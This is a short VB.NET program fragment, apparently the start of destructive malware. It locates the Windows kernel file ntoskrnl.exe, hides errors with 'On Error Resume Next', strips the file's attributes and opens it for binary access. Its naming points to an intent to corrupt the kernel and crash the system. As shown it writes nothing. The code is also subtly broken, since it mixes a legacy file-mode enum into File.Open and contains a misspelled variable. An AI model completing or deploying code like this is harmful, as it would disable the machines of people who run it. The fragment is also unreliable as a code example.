Imports System.IO
Module BCD
    Public BugCheckApplication As String = Environment.GetFolderPath(Environment.SpecialFolder.System) & "\ntoskrnl.exe"
    Public Sub Main()
        On Error Resume Next
        SetAttr(BugCheckApplication, FileAttribute.Normal)
        Dim SyatemBinary As FileStream = File.Open(BugCheckApplication, OpenMode.Binary)

    End Sub
End Module
